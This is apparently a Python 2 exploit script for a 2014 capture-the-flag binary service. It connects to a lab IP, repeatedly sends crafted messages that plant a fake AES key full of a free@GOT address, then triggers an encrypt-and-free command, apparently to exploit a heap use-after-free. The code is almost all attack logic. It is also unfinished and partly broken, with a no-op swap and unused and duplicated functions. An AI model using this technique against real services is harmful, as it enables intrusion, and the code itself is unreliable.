__author__ = 'HuyNA'


import struct
import socket
import telnetlib
import hexdump
import time
import hashlib
import sys
#from pexpect import spawn

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0xFF)
    return decode_string

def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop

def write_file(file_name, content):
    f = open(file_name,'wb')
    f.write(content)
    f.close()

def read_file(file_name):
    f = open(file_name, 'rb')
    content = ''
    byte = f.read(1)
    while byte != b"":
        content += byte
        byte = f.read(1)
    f.close()
    return content

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop
#shellcode = read_file('run_bin_sh')


# nc vuln2014.picoctf.com 4000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('qiwictf2014.ru', 3671))
s.connect(('192.168.248.132', 3671))

OPTION_A = 'A'
OPTION_R = 'R'
OPTION_4 = '4'
OPTION_E = 'E'

AES_ENCRYPT = 2
AES_DECRYPT = 0
AES_FREE_KEY = 1

FREE_KEY_4 = 1
UNFREE_KEY_4 = 0

def option_A(option):
    data = OPTION_A
    data += chr(option)
    data += 'b'*16
    return data

def option_R():
    data = OPTION_R

    return data

def option_4(option,base64_buffer):
    # command 4
    data = OPTION_4
    them = 'c'*4
    # section 1
    print base64_buffer
    print base64_buffer.encode('base64')
    fake = 'YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh'
    data += chr(len(fake)+len(them))+them+fake

    # dword dung de malloc 1 vung nho moi => cung la vung nho output
    unknown_dword = 0xfc
    data += pi(unknown_dword)

    # last byte is option flag
    data += chr(option)
    return data
def doicho(a,b):
    c=a;a=b;b=c
def encode_4(salt):
    a = []
    for i in range(0,256):
        a.append(i)
    b = 0
    c = 0
    for i in xrange(0,256):
        c += a[i]+salt[i%len(salt)]
        c = c & 0xFF
        doicho(a[i],a[c])

# recv welcome message
print recv_until(s, '\n')

# alloc buffer size = 256 bytes to fake aes_key
address_free_got = pi(0x0804B040)
overwrite = address_free_got*2
temp_string='huyn'
fake_aes_key = overwrite + 'c'*(184-len(overwrite))

for i in range(5):
    print '[+] '+str(i)
    time.sleep(0.01)
    data_sent = option_4(UNFREE_KEY_4, fake_aes_key)
    size_data = pi(len(data_sent))
    s.send(size_data+data_sent)
    time.sleep(0.01)
    print s.recv(100)


# call AES sau khi da alloc + free 1 vung nho nao do
data_sent = option_A(AES_ENCRYPT+AES_FREE_KEY)
size_data = pi(len(data_sent))
s.send(size_data+data_sent+'\n')

print s.recv(100)



